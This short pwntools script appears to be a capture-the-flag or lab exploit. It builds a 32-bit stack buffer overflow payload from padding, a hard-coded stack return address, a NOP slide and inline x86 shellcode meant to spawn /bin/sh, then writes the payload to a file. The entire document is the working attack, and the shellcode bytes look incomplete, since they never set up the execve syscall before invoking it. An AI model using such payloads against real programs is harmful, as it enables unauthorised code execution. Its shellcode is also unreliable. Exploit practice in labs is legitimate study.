from pwn import *

stack = 0xffffd89c
nopslide = b'\x90'*32
bin_sh = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xcd\x80\x31\xc0\x40\xcd\x80'

payload = b'A'*132 + b'AAABBBCC'
payload += p32(stack + 16)
payload += nopslide
payload += bin_sh

open("payload.txt", "wb").write(payload)
